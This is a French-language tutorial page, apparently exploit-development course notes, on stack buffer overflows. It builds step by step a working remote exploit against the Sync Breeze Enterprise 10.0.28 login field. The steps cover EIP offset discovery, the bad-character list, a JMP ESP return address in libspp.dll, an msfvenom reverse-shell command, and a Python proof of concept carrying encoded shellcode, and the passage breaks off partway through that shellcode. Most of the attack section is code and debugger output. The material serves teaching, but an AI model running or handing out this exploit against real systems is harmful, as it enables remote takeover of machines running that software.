pile.</p>"},{"location":"binary-exploitation/1-stack-overflow/#theorie","title":"Th\u00e9orie","text":"<p>Exemple de programme vuln\u00e9rable \u00e0 un stack buffer overflow :</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main(int argc, char *argv[])\n{\n  char buffer[64];\n\n  if (argc &lt; 2)\n  {\n    printf(\"Supply at least one argument\\n\");\n    return 1;\n  }\n\n  strcpy(buffer, argv[1]);\n\n  return 0;\n}\n</code></pre> <p>Ce programme d\u00e9clare une variable local nomm\u00e9e <code>buffer</code> de  64 caract\u00e8res. Un espace de 64 bytes dans la pile va donc \u00eatre r\u00e9serv\u00e9 pour cette variable \u00e0 l'ex\u00e9cution.</p> <p>Cet espace sera r\u00e9serv\u00e9 au sein de la stack frame de la fonction <code>main</code> du programme.</p> <p>Les variables locales ont une scope locale et ne sont donc accessibles que dans le cadre de la fonction ou du bloc dans lequel elles sont d\u00e9clar\u00e9es. Les variables globales sont stock\u00e9es dans la section <code>.data</code> du programme, se trouvant dans un autre espace m\u00e9moire accessible a tout le code.</p> <p>La fonction <code>strcpy</code> d\u00e9finie dans <code>string.h</code> copie l'argument fourni en param\u00e8tre \u00e0 <code>main</code> dans la variable <code>buffer</code>.</p> <p>Dans le cas de ce programme</p> <ul> <li>Si l'argument fait 64 bytes ou moins, le programme va fonctionner</li> <li>Si l'argument fait plus que 64 des parties adjacentes au buffer dans la pile vont \u00eatre re\u00e9crites entrainant un d\u00e9passement de tampon</li> </ul> <p> </p> <p>Si le d\u00e9passement de tampon est assez large l'attaquant pourrait \u00eatre capable de r\u00e9\u00e9crire l'adresse de retour de la fonction vuln\u00e9rable sur la pile avec de la donn\u00e9e arbitraire.</p> <p>Quand une fonction termine son ex\u00e9cution, l'adresse de retour est r\u00e9cup\u00e9r\u00e9e depuis la pile et  pour restaurer le flot d'ex\u00e9cution \u00e0 la fonction appelante</p> <p>Dans notre exemple :</p> <ul> <li>Pour la fonction <code>main</code> l'adresse de retour r\u00e9\u00e9crite \u00e0 la suite du d\u00e9passement de tampon est mise dans le registre <code>Extended Instruction Pointer</code> (<code>EIP</code>)</li> <li>Le CPU va donc essayer de lire l'adresse de l'instruction suivante \u00e0 partir de l'adresse dans <code>EIP</code><ul> <li><code>0x41414141</code> (<code>0x41</code> \u00e9tant le code hexad\u00e9cimal de <code>A</code>)</li> </ul> </li> <li>Comme cela n'est pas une adresse valide le CPU va renvoyer une erreur access violation et l'application va s'arr\u00eater</li> </ul> <p>Le registre <code>EIP</code> est utilis\u00e9 directement par le CPU pour ex\u00e9cuter du code au niveau assembleur. Obtenir un acc\u00e8s \u00e0 <code>EIP</code> permettrait d'ex\u00e9cuter du code arbitraire.</p>"},{"location":"binary-exploitation/1-stack-overflow/#pratique","title":"Pratique","text":"<p>L'exemple utilis\u00e9 sera l'exploit portant sur l'application Sync Breeze Enterprise 10.0.28.</p>"},{"location":"binary-exploitation/1-stack-overflow/#identifier-le-depassement","title":"Identifier le d\u00e9passement","text":"<p>La premi\u00e8re \u00e9tape est d'identifier la pr\u00e9sence du d\u00e9passement de tampon. L'identification passe g\u00e9n\u00e9ralement par trois axes :</p> <ul> <li>Analyse de code</li> <li>R\u00e9tro-ing\u00e9nierie</li> <li>Fuzzing</li> </ul> <p>Dans ce cas, c'est le champ <code>username</code> de la requ\u00eate qui est vuln\u00e9rable.</p> <p>D\u00e9but de la preuve de concept en <code>Python</code> :</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\n\ntry:\n  server = sys.argv[1]\n\n  port = 80\n  size = 800\n\n  inputBuffer = b\"A\" * size\n  content = b\"username=\" + inputBuffer + b\"&amp;password=A\"\n\n  buffer = b\"POST /login HTTP/1.1\\r\\n\"\n  buffer += b\"Host: \" + server.encode() + b\"\\r\\n\"\n[...]\n  buffer += content\n</code></pre> <p>Si on s'attache au service avec WinDbg et qu'on ex\u00e9cute cette preuve de concept, on obtient le r\u00e9sultat suivant :</p> <pre><code>(1ed8.25d0): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000001 ebx=00000000 ecx=0060c0eb edx=0000034f esi=00603966 edi=00e83570\neip=41414141 esp=01eb745c ebp=005ff5b8 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202\n41414141 ??              ???\n</code></pre> <p>L'envoi de 800 bytes dans le champ <code>username</code> entraine bien un d\u00e9passement de tampon. Le registre <code>EIP</code> est initialis\u00e9 \u00e0 <code>4141414</code>.</p>"},{"location":"binary-exploitation/1-stack-overflow/#controler-le-registre-eip","title":"Contr\u00f4ler le registre EIP","text":"<p>Une fois le d\u00e9passement identifi\u00e9, l'objectif principal est de :</p> <ul> <li>Contr\u00f4ler le registre <code>EIP</code> pour maitriser le flot d'ex\u00e9cution de l'application</li> <li>Injecter du code arbitraire malicieux au sein de l'espace m\u00e9moire du processus cible</li> <li>Rediriger le flot d'ex\u00e9cution dessus pour obtenir par exemple un reverse shell</li> </ul> <p>On sait juste qu'une partie de nos <code>A</code> ont rempli <code>EIP</code>. Mais on a besoin de savoir quelle partie exactement remplit <code>EIP</code>.</p> <p>Pour cela on va envoyer une chaine de caract\u00e8re non r\u00e9p\u00e9titive qui permet d'identifier instantan\u00e9ment la position des 4 bytes pr\u00e9sents dans <code>EIP</code>. On utilise l'outil <code>msf-pattern_create</code> :</p> <pre><code>$ msf-pattern_create -l 800\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba\n</code></pre> <p>On modifie la preuve de concept en rempla\u00e7ant les <code>A</code> par la chaine g\u00e9n\u00e9r\u00e9e :</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\n\ntry:\n  server = sys.argv[1]\n\n  port = 80\n\n  inputBuffer = b\"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba\"\n\n  content = b\"username=\" + inputBuffer + b\"&amp;password=A\"\n[...]\n</code></pre> <p>WinDbg suite \u00e0 l'ex\u00e9cution de l'exploit :</p> <pre><code>(20ec.1440): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000001 ebx=00000000 ecx=0063ed43 edx=0000034f esi=00633e86 edi=00d33570\neip=42306142 esp=01b6745c ebp=00632b68 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202\n42306142 ??              ???\n</code></pre> <p>Le registre <code>EIP</code> contient <code>42306142</code> qui est la version hexad\u00e9cimale de <code>B0aB</code> que l'on retrouve bien dans la chaine g\u00e9n\u00e9r\u00e9e par <code>msf-pattern_create</code>.</p> <p>Pour identifier l'offset exacte, on peut utiliser <code>msf-pattern_offset</code> :</p> <pre><code>$ msf-pattern_offset -l 800 -q 42306142\n[*] Exact match at offset 780\n</code></pre> <p>On modifie la preuve de concept en adaptant le nombre de <code>A</code> et en r\u00e9\u00e9crivant <code>EIP</code> sp\u00e9cifiquement avec des <code>B</code> :</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\n\ntry:\n  server = sys.argv[1]\n\n  port = 80\n\n  filler = b\"A\" * 780\n  eip = b\"B\" * 4\n  garbage = b\"C\" * 16\n  inputBuffer = filler + eip + garbage\n  content = b\"username=\" + inputBuffer + b\"&amp;password=A\"\n  [...]\n</code></pre> <p>WinDbg suite \u00e0 l'ex\u00e9cution de l'exploit :</p> <pre><code>(a10.608): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000001 ebx=00000000 ecx=0059ae13 edx=0000034f esi=00594a76 edi=00de3570\neip=42424242 esp=01a1745c ebp=005923d8 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202\n42424242 ??              ???\n</code></pre> <p>Le registre <code>EIP</code> contient <code>42424242</code> qui corresponds bien \u00e0 <code>BBBB</code>, le registre est donc correctement sous notre contr\u00f4le.</p>"},{"location":"binary-exploitation/1-stack-overflow/#chercher-de-lespace","title":"Chercher de l'espace","text":"<p><code>EIP</code> est sous notre contr\u00f4le, mais il faut identifier la bonne adresse \u00e0 stocker dedans pour rediriger le flot d'ex\u00e9cution vers l'espace m\u00e9moire ou l'ont aura stock\u00e9 notre shellcode. Le shellcode doit \u00eatre dans l'espace m\u00e9moire du processus.</p> <p>WinDbg suite \u00e0 l'ex\u00e9cution de l'exploit :</p> <pre><code>0:009&gt; dds esp -10 L8\n01a1744c  41414141\n01a17450  41414141                # Fin des 780 `A`\n01a17454  42424242                # EIP avec des 4 `B`\n01a17458  43434343                # Les quatre premiers `C`\n01a1745c  43434343                # Adresse point\u00e9e par ESP\n01a17460  43434343\n01a17464  43434343\n01a17468  00de7500\n</code></pre> <p>Un payload de reverse shell standard requiert approximativement 350 a 400 bytes d'espace. Dans la liste ci-dessus on voit 4x4 bytes dans le buffer ce qui n'est pas assez grand pour le shellcode.</p> <p>Il faut agrandir le buffer de <code>800</code> \u00e0 <code>1500</code> et s'assurer que le shellcode aura assez de place sans casser la condition du d\u00e9passement de tampon ou la nature d'arr\u00eat de l'application.</p> <p>On modifie la preuve de concept en augmentant la taille du futur shellcode :</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\n\ntry:\n  server = sys.argv[1]\n  port = 80\n\n  filler = b\"A\" * 780\n  eip = b\"B\" * 4\n  # Permet de venir temporiser avant d'arriver dans ESP\n  offset = b\"C\" * 4\n  # Adresse pointee par ESP et suite\n  shellcode = b\"D\" * (1500 - len(filler) - len(eip) - len(offset))\n  inputBuffer = filler + eip + offset + shellcode\n\n  content = b\"username=\" + inputBuffer + b\"&amp;password=A\"\n</code></pre> <p>WinDbg suite \u00e0 l'ex\u00e9cution de l'exploit :</p> <pre><code>0:011&gt; dds esp L10\n01bb745c  44444444\n01bb7460  44444444\n01bb7464  44444444\n01bb7468  44444444\n01bb746c  44444444\n01bb7470  44444444\n01bb7474  44444444\n01bb7478  44444444\n01bb747c  44444444\n01bb7480  44444444\n01bb7484  44444444\n01bb7488  44444444\n01bb748c  44444444\n01bb7490  44444444\n01bb7494  44444444\n01bb7498  44444444\n#\n#\n0:011&gt; .formats 2c0\nEvaluate expression:\n  Hex:     000002c0\n  Decimal: 704\n#\n# Il y a 712 `D` car `712` = 1500 - (780 (`A`) + 4 (`C`) + 4 (`C`))\n#  On va lire jusqu'a `ESP` +`704` et il reste bien `8` * `D`\n0:011&gt; dds esp+2c0 L4\n01bb771c  44444444\n01bb7720  44444444\n01bb7724  00000000\n01bb7728  00000000\n#\n#\n0:011&gt; ? 01bb7724 - 01bb745c\nEvaluate expression: 712 = 000002c8\n</code></pre>"},{"location":"binary-exploitation/1-stack-overflow/#identifier-les-mauvais-caracteres","title":"Identifier les mauvais caract\u00e8res","text":"<p>En fonction de l'application, du type de vuln\u00e9rabilit\u00e9 ou du protocole utilise certains caract\u00e8res sont consid\u00e9r\u00e9 comme bad. Les bad char ne doivent pas \u00eatre utilis\u00e9s dans le buffer, l'adresse de retour ou le shellcode.</p> <p>Un caract\u00e8re est consid\u00e9r\u00e9 comme bad s'il entraine un changement dans la nature du crash ou une d\u00e9formation en m\u00e9moire tel que <code>0x00</code> qui est le null byte.</p> <p>Le caract\u00e8re  <code>0x00</code> doit \u00eatre syst\u00e9matiquement \u00e9vit\u00e9.</p> <p>Il faut tester et identifier l'ensemble des <code>bad</code> caract\u00e8res a chaque d\u00e9veloppement d'exploit en envoyant l'ensemble des caract\u00e8res possible entre <code>0x00</code> et <code>0xFF</code> au sein du buffer pour observer la r\u00e9action de l'application.</p> <p>On modifie la preuve de concept afin d'inclure l'ensemble des caract\u00e8res possible sauf <code>0x00</code> :</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\n\ntry:\n  server = sys.argv[1]\n\n  port = 80\n\n  filler = b\"A\" * 780\n  eip = b\"B\" * 4\n  offset = b\"C\" * 4\n  badchar = (\n    b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\"\n    b\"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\"\n    b\"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\"\n    b\"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"\n    b\"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"\n    b\"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\"\n    b\"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\"\n    b\"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\"\n    b\"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\"\n    b\"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\"\n    b\"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\"\n    b\"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\"\n    b\"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\"\n    b\"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\"\n    b\"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\"\n    b\"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\")\n\n  inputBuffer = filler + eip + offset + badchar\n\n  content = b\"username=\" + inputBuffer + b\"&amp;password=A\"\n[...]\n</code></pre> <p>WinDbg suite \u00e0 l'ex\u00e9cution de l'exploit :</p> <pre><code>(13dc.2314): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000001 ebx=00000000 ecx=0069a5e2 edx=0000032e esi=00692c3e edi=00e23570\neip=42424242 esp=01a5745c ebp=0068d088 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202\n42424242 ??              ???\n#\n#\n0:009&gt; db esp -10 L20\n01a5744c  41 41 41 41 41 41 41 41-42 42 42 42 43 43 43 43  AAAAAAAABBBBCCCC\n01a5745c  01 02 03 04 05 06 07 08-09 00 e3 00 20 76 e2 00  ............ v..\n</code></pre> <p>On voit qu'il y a un passage de <code>0x09</code> \u00e0 <code>0x00</code>, <code>0x0a</code> n'est pas pr\u00e9sent. <code>0x0a</code> repr\u00e9sente un saut de ligne (line feed) qui permet de terminer un champ <code>HTTP</code> (retour \u00e0 la ligne).</p> <p>On retire donc <code>0x0a</code> de notre liste de caract\u00e8res. On r\u00e9it\u00e8re ce m\u00eame processus jusqu'\u00e0 identifier l'ensemble des mauvais caract\u00e8res.</p> <p>La liste finale des mauvais caract\u00e8res est <code>0x00</code> - <code>0x0a</code> - <code>0x0d</code> - <code>0x25</code> - <code>0x26</code> - <code>0x2b</code> - <code>0x3d</code>.</p>"},{"location":"binary-exploitation/1-stack-overflow/#redirection-du-flot-dexecution","title":"Redirection du flot d'ex\u00e9cution","text":"<p>Il faut maintenant rediriger le flot d'ex\u00e9cution vers le shellcode stock\u00e9 \u00e0 l'adresse m\u00e9moire ou le registre <code>ESP</code> pointe. Intuitivement, on voudrait mettre l'adresse point\u00e9e par <code>ESP</code> dans <code>EIP</code> \u00e0 la place des <code>B</code> mais l'adresse change \u00e0 chaque ex\u00e9cution.</p>"},{"location":"binary-exploitation/1-stack-overflow/#trouver-une-adresse-de-retour","title":"Trouver une adresse de retour","text":"<p>On va toujours stocker notre shellcode \u00e0 partir de l'adresse stock\u00e9e dans <code>ESP</code>, mais on a besoin d'un moyen efficace pour ex\u00e9cuter ce code. Une solution est d'utiliser l'instruction <code>JMP ESP</code> qui permet de sauter jusqu'\u00e0 l'adresse point\u00e9e par <code>ESP</code>.</p> <p>Si on trouve une adresse statique contenant cette instruction on peut rediriger <code>EIP</code> dessus. Ainsi l'instruction <code>JMP ESP</code> sera ex\u00e9cut\u00e9e entrainant l'ex\u00e9cution du shellcode.</p> <p>De nombres libraries contiennent cette instruction. Certains criteres sont a respecter tel que :</p> <ul> <li>L'adresse doit \u00eatre statique et donc pas de librairies compil\u00e9es en <code>ASLR</code></li> <li>Adresse sans bad char pour ne pas briser l'exploit comme l'adresse va faire parti du buffer</li> </ul> <p>L'identification des protections en place sur un binaire peut se faire \u00e0 travers l'analyse manuelle des structures du <code>PE</code>. Ou bien \u00e0 travers l'utilisation d'outil tel que <code>Process Hacker</code>.</p> <p>Dans le cadre de l'exemple utilis\u00e9, la librairie <code>libspp.dll</code> ne poss\u00e8de aucune protection et son <code>Image base</code> ne contient pas de bad char.</p> <p>On doit maintenant trouver une instruction <code>JMP ESP</code> dans ce module. On utilise le module <code>MSF</code> <code>NASM</code> pour obtenir les opcodes \u00e9quivalents \u00e0 <code>jmp esp</code> :</p> <pre><code>$ msf-nasm_shell\nnasm &gt; jmp esp\n00000000  FFE4              jmp esp\n</code></pre> <p>Les opcodes \u00e0 chercher sont <code>0xFF</code> et <code>0xE4</code>, on peut les chercher avec la commande <code>Search</code> (<code>s</code>) de WinDbg.</p> <p>On affiche les adresses de d\u00e9but et de fin du module <code>libspp.dll</code> :</p> <pre><code>0:011&gt; lm m libspp\nBrowse full module list\nstart    end        module name\n10000000 10223000   libspp     (deferred)\n</code></pre> <p>On cherche entre l'adresse <code>10000000</code> et l'adresse <code>10223000</code> les opcodes <code>0xFF</code> et <code>0xE4</code> :</p> <pre><code>0:011&gt; s -b 10000000 10223000 0xFF 0xE4\n10090c83  ff e4 0b 09 10 02 0c 09-10 24 0c 09 10 46 0c 09  .........$...F..\n</code></pre> <p>WinDbg trouve l'adresse <code>10090c83</code> au sein du module qui contient ces 2 opcodes. L'adresse ne contient aucun bad char. On affiche le contenus de l'adresse :</p> <pre><code>0:011&gt; u 10090c83\n10090c83 ffe4            jmp     esp\n[...]\n</code></pre> <p>On modifie la preuve de concept en indiquant l'adresse identifi\u00e9e au format little endian, format le plus utilis\u00e9 :</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\n\ntry:\n  server = sys.argv[1]\n\n  port = 80\n\n  filler = b\"A\" * 780\n  eip = b\"\\x83\\x0c\\x09\\x10\" # 10090c83 - JMP ESP\n  offset = b\"C\" * 4\n  shellcode = b\"D\" * (1500 - len(filler) - len(eip) - len(offset))\n  inputBuffer = filler + eip + offset + shellcode\n  content = b\"username=\" + inputBuffer + b\"&amp;password=A\"\n</code></pre> <p>WinDbg suite \u00e0 l'ex\u00e9cution de l'exploit :</p> <pre><code>#\n# On definis un `break point` sur l'adresse contenant `JMP ESP`\n0:011&gt; bp 10090c83\n#\n# Relancer l'ex\u00e9cution\n0:011&gt; g\n#\n# EIP est correctement initialis\u00e9 avec l'adresse contenant `JMP ESP`\nBreakpoint 0 hit\neax=00000001 ebx=00000000 ecx=0062102b edx=0000034f esi=00611a5e edi=00e53570\neip=10090c83 esp=0218745c ebp=0060d9c0 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202\nlibspp!SCA_FileScout::GetStatusValue+0xb3:\n10090c83 ffe4            jmp     esp {0218745c}\n#\n# On avance d\u2019une \u00e9tape\n# EIP contient maintenant `0218745c` qui est bien l'adresse pr\u00e9sente dans `ESP`\n0:011&gt; t\neax=00000001 ebx=00000000 ecx=0062102b edx=0000034f esi=00611a5e edi=00e53570\neip=0218745c esp=0218745c ebp=0060d9c0 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202\n0218745c 44              inc     esp\n#\n#\n0:011&gt; dc EIP l4\n0218745c  44444444 44444444 44444444 44444444  DDDDDDDDDDDDDDDD\n</code></pre>"},{"location":"binary-exploitation/1-stack-overflow/#generation-dun-shellcode","title":"G\u00e9n\u00e9ration d'un shellcode","text":"<p>L'outil <code>msfvenom</code> permet de g\u00e9n\u00e9rer facilement des shellcode complexes. Il est important de g\u00e9n\u00e9rer un shellcode ne contenant aucun des bad char identifi\u00e9s.</p> <p>Pour cela on doit utiliser un encodeur pour g\u00e9n\u00e9rer un shellcode sans bad char. L'encodeur va remplacer les bad char par d'autres caract\u00e8res autoris\u00e9s sans impacter le fonctionnement du shellcode :</p> <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f c \u2013e x86/shikata_ga_nai -b \"\\x00\\x0a\\x0d\\x25\\x26\\x2b\\x3d\"\n</code></pre> <p>Le shellcode g\u00e9n\u00e9r\u00e9 et encod\u00e9 par <code>msfvenom</code> n'est pas directement ex\u00e9cutable, car il est pr\u00e9c\u00e9d\u00e9 d'un d\u00e9codeur. La routine du d\u00e9codeur entraine des modifications des bytes du d\u00e9codeur lui-m\u00eame ce qui entraine l'erreur du processus de d\u00e9codage.</p> <p>Pour r\u00e9soudre ce probl\u00e8me il faut cr\u00e9er une zone tampon pour <code>JMP ESP</code> pour \u00e9viter que le shellcode soit modifi\u00e9 avec l'instruction <code>NOP</code> (0x90).</p> <p><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; EXITFUNC=thread -f c \u2013e x86/shikata_ga_nai -b \"\\x00\\x0a\\x0d\\x25\\x26\\x2b\\x3d\" -v shellcode</code></p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\n\ntry:\n  server = sys.argv[1]\n\n  port = 80\n\n  filler = b\"A\" * 780\n  eip = b\"\\x83\\x0c\\x09\\x10\" # 10090c83 - JMP ESP\n  offset = b\"C\" * 4\n  nops = b\"\\x90\" * 10       # Zone tampon\n\n  shellcode = bytearray(\n\"\\xd9\\xc5\\xd9\\x74\\x24\\xf4\\xb8\\xe5\\xb0\\xc8\\xeb\\x5b\\x31\\xc9\"\n\"\\xb1\\x52\\x31\\x43\\x17\\x83\\xeb\\xfc\\x03\\xa6\\xa3\\x2a\\x1e\\xd4\"\n\"\\x2c\\x28\\xe1\\x24\\xad\\x4d\\x6b\\xc1\\x9c\\x4d\\x0f\\x82\\x8f\\x7d\"\n\"\\x5b\\xc6\\x23\\xf5\\x09\\xf2\\xb0\\x7b\\x86\\xf5\\x71\\x31\\xf0\\x38\"\n\"\\x81\\x6a\\xc0\\x5b\\x01\\x71\\x15\\xbb\\x38\\xba\\x68\\xba\\x7d\\xa7\"\n\"\\x81\\xee\\xd6\\xa3\\x34\\x1e\\x52\\xf9\\x84\\x95\\x28\\xef\\x8c\\x4a\"\n\"\\xf8\\x0e\\xbc\\xdd\\x72\\x49\\x1e\\xdc\\x57\\xe1\\x17\\xc6\\xb4\\xcc\"\n\"\\xee\\x7d\\x0e\\xba\\xf0\\x57\\x5e\\x43\\x5e\\x96\\x6e\\xb6\\x9e\\xdf\"\n\"\\x49\\x29\\xd5\\x29\\xaa\\xd4\\xee\\xee\\xd0\\x02\\x7a\\xf4\\x73\\xc0\"\n\"\\xdc\\xd0\\x82\\x05\\xba\\x93\\x89\\xe2\\xc8\\xfb\\x8d\\xf5\\x1d\\x70\"\n\"\\xa9\\x7e\\xa0\\x56\\x3b\\xc4\\x87\\x72\\x67\\x9e\\xa6\\x23\\xcd\\x71\"\n\"\\xd6\\x33\\xae\\x2e\\x72\\x38\\x43\\x3a\\x0f\\x63\\x0c\\x8f\\x22\\x9b\"\n\"\\xcc\\x87\\x35\\xe8\\xfe\\x08\\xee\\x66\\xb3\\xc1\\x28\\x71\\xb4\\xfb\"\n\"\\x8d\\xed\\x4b\\x04\\xee\\x24\\x88\\x50\\xbe\\x5e\\x39\\xd9\\x55\\x9e\"\n\"\\xc6\\x0c\\xf9\\xce\\x68\\xff\\xba\\xbe\\xc8\\xaf\\x52\\xd4\\xc6\\x90\"\n\"\\x43\\xd7\\x0c\\xb9\\xee\\x22\\xc7\\x06\\x46\\x01\\xad\\xef\\x95\\x59\"\n\"\\xd0\\x54\\x10\\xbf\\xb8\\xba\\x75\\x68\\x55\\x22\\xdc\\xe2\\xc4\\xab\"\n\"\\xca\\x8f\\xc7\\x20\\xf9\\x70\\x89\\xc0\\x74\\x62\\x7e\\x21\\xc3\\xd8\"\n\"\\x29\\x3e\\xf9\\x74\\xb5\\xad\\x66\\x84\\xb0\\xcd\\x30\\xd3\\x95\\x20\"\n\"\\x49\\xb1\\x0b\\x1a\\xe3\\xa7\\xd1\\xfa\\xcc\\x63\\x0e\\x3f\\xd2\\x6a\"\n\"\\xc3\\x7b\\xf0\\x7c\\x1d\\x83\\xbc\\x28\\xf1\\xd2\\x6a\\x86\\xb7\\x8c\"\n\"\\xdc\\x70\\x6e\\x62\\xb7\\x14\\xf7\\x48\\x08\\x62\\xf8\\x84\\xfe\\x8a\"\n\"\\x49\\x71\\x47\\xb5\\x66\\x15\\x4f\\xce\\x9a\\x85\\xb0\\x05\\x1f\\xa5\"\n\"\\x52\\x